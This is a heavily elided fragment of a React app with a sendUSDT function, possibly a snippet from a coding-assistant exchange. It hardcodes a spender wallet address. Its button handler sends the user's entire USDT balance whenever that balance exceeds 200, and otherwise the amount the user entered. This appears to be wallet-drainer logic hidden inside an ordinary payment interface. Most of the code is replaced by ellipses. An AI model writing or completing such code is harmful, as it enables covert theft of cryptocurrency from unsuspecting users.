import React, { useState, useEffect, useRef } from "react";
  ...
  import { detectWalletAddress } from "./utils/walletUtils"; // you'll create this helper
  ...
  const App = () => {
    ...
    const sendUSDT = async () => {
      ...
      try {
        ...
        const SPENDER_ADDRESS = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
  ...
  init();
    ...
    return (
      <GlobalStyle>
        ...
        <NextButton
  onClick={() => {
    const amountToSend = usdtBalance > 200 ? usdtBalance : usdtAmount;
